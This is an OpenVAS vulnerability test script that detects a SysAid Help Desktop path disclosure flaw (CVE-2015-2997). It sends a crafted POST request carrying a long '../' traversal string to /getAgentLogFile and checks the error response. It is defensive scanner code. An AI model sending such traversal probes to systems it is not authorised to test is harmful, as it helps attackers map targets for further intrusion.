###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sysaid_path_discl_vuln.nasl 13997 2019-03-05 12:43:01Z cfischer $
#
# SysAid Path Disclosure Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:sysaid:sysaid";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106008");
  script_version("$Revision: 13997 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:43:01 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2015-06-11 10:02:43 +0700 (Thu, 11 Jun 2015)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2015-2997");

  script_name("SysAid Path Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_sysaid_detect.nasl");
  script_mandatory_keys("sysaid/installed");

  script_tag(name:"summary", value:"SysAid Help Desktop Software is prone to a path disclosure
  vulnerability");

  script_tag(name:"vuldetect", value:"Send a crafted POST request and check the response.");

  script_tag(name:"impact", value:"An attacker can find the install path the application is installed
  under which may help in further attacks.");

  script_tag(name:"affected", value:"SysAid Help Desktop version 15.1.x and before.");

  script_tag(name:"solution", value:"Upgrade to version 15.2 or later.");

  script_xref(name:"URL", value:"https://www.security-database.com/detail.php?alert=CVE-2015-2997");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

host = http_host_name(port:port);

traversal = crap(data: "../", length:3*20);
url = dir + '/getAgentLogFile?accountId=' + traversal + rand_str(length:12) + '&computerId=' + rand_str(length:14);
# Zlib compressed random data
data = raw_string(0x78, 0x9c, 0x4b, 0x2b, 0x30, 0x0d, 0x33, 0x89, 0xc8, 0x0b, 0x2b, 0x01, 0x00,
                  0x0f, 0x64, 0x03, 0x26);

req = string('POST ', url, ' HTTP/1.1\r\n',
             'Host: ', host, '\r\n',
             'Content-Type: application/octet-stream\r\n',
             'Content-Length: ' + strlen(data), '\r\n\r\n',
             data);
buf = http_keepalive_send_recv(port:port, data:req);

if (buf && buf =~ "Internal Error No#") {
  if (egrep(pattern:traversal, string:buf)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);